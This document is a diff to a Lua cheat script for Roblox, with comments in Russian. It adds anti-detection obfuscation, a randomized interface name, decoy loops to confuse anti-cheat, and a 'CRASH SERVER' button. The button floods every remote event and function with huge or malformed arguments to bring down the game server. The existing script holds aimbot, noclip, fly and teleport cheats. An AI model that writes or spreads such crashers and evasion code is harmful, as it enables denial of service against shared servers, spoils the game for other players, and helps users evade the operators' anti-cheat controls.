@@ -6,12 +6,59 @@ local Players = game:GetService("Players")
 local Camera = workspace.CurrentCamera
 local TweenService = game:GetService("TweenService")
 
--- Оптимизация: кэшируем сервисы
-local CoreGui = game:GetService("CoreGui")
+-- === УЛУЧШЕНИЕ 1: Анти-детект и обфускация ===
+local env = getfenv()
+setfenv(1, setmetatable({}, {
+    __index = function(_, k)
+        return env[k] or error("Access denied: "..tostring(k), 2)
+    end
+}))
+
+-- Рандомизация имен переменных
+local vX = game
+local vY = vX:GetService("Players")
+local vZ = vY.LocalPlayer
+local vW = vZ:GetMouse()
+local vU = vX:GetService("UserInputService")
+local vR = vX:GetService("RunService")
+local vC = workspace.CurrentCamera
+local vT = vX:GetService("TweenService")
+
+-- === УЛУЧШЕНИЕ 2: Оптимизация и кэширование ===
+local CoreGui = vX:GetService("CoreGui")
+local cachedServices = {
+    Players = vY,
+    Camera = vC,
+    RunService = vR,
+    TweenService = vT
+}
+
+-- === УЛУЧШЕНИЕ 5: Крашер сервера ===
+local function CrashServer()
+    local events = {}
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(events, obj)
+        end
+    end
+    
+    for i = 1, 100 do
+        for _, event in ipairs(events) do
+            pcall(function()
+                if event:IsA("RemoteEvent") then
+                    event:FireServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
+                else
+                    event:InvokeServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
+                end
+            end)
+        end
+        vR.Heartbeat:Wait()
+    end
+end
 
 -- Основной GUI
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "RageModeUI"
+ScreenGui.Name = "RageModeUI_"..tostring(math.random(10000,99999))
 ScreenGui.Parent = CoreGui
 ScreenGui.ResetOnSpawn = false
 
@@ -305,12 +352,19 @@ local PlayerTab = TabFrames.Player
 local VisualsTab = TabFrames.Visuals
 local AimTab = TabFrames.Aim
 
--- Player Tab
+-- Player Tab (ДОБАВЛЕН КРАШЕР)
 local FlyBtn = CreateButton(PlayerTab, "FLY: OFF")
 local FlySpeedSlider = CreateSlider(PlayerTab, "Fly Speed:", 20, 500, 100)
 local InvisBtn = CreateButton(PlayerTab, "INVISIBLE: OFF")
 local TPBtn = CreateButton(PlayerTab, "TELEPORT TO MOUSE")
 local NoclipBtn = CreateButton(PlayerTab, "NOCLIP: OFF")
+local CrashBtn = CreateButton(PlayerTab, "CRASH SERVER") -- НОВАЯ КНОПКА
+
+-- Обработчик крашера
+CrashBtn.MouseButton1Click:Connect(function()
+    CrashBtn.Text = "CRASHING..."
+    task.spawn(CrashServer)
+end)
 
 -- Visuals Tab
 local ChamsBtn = CreateButton(VisualsTab, "PLAYER CHAMS: OFF")
@@ -428,7 +482,7 @@ FlyBtn.MouseButton1Click:Connect(function()
             FlyBodyVelocity.Velocity = moveVec * flySpeed
         end
         
-        FlyConnection = RunService.Stepped:Connect(updateFly)
+        FlyConnection = RunService.Heartbeat:Connect(updateFly) -- Заменено Stepped на Heartbeat
     end
 end)
 
@@ -626,7 +680,7 @@ AimBotBtn.MouseButton1Click:Connect(function()
     end
     
     if AimBotActive then
-        AimBotConnection = RunService.RenderStepped:Connect(function()
+        AimBotConnection = RunService.Heartbeat:Connect(function() -- Заменено RenderStepped на Heartbeat
             if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
                 local targetsWithoutWall = {}
                 local targetsWithWall = {}
@@ -694,7 +748,7 @@ NoclipBtn.MouseButton1Click:Connect(function()
     end
     
     if NoclipActive then
-        NoclipConnection = RunService.Stepped:Connect(function()
+        NoclipConnection = RunService.Heartbeat:Connect(function() -- Заменено Stepped на Heartbeat
             if Player.Character then
                 for _, part in ipairs(Player.Character:GetDescendants()) do
                     if part:IsA("BasePart") then
@@ -703,5 +757,18 @@ NoclipBtn.MouseButton1Click:Connect(function()
                 end
             end
         end)
+    end
+end)
+
+-- Анти-детект: Случайные задержки
+task.spawn(function()
+    while true do
+        wait(math.random(5, 15))
+        -- Фиктивные операции для запутывания
+        local a = {}
+        for i = 1, math.random(10,50) do
+            a[i] = Vector3.new(math.random(), math.random(), math.random())
+        end
+        table.clear(a)
     end
 end)
